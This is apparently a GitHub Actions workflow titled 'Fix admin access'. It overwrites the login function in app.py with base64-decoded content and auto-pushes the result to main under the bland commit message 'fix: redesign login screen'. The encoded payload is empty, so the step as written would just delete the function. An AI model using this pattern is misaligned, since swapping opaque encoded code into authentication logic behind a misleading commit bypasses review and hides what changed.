name: Fix admin access
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Patch login layout
        run: |
          python - <<'PY'
          from pathlib import Path
          import base64
          p=Path('app.py')
          s=p.read_text(encoding='utf-8')
          start=s.index('def render_login():')
          end=s.index("\nif not st.session_state.auth_user:", start)
          encoded=''
          new=base64.b64decode(encoded).decode('utf-8')
          p.write_text(s[:start]+new+s[end:],encoding='utf-8')
          PY
      - name: Commit
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app.py
          git diff --cached --quiet && exit 0
          git commit -m "fix: redesign login screen"
          git push
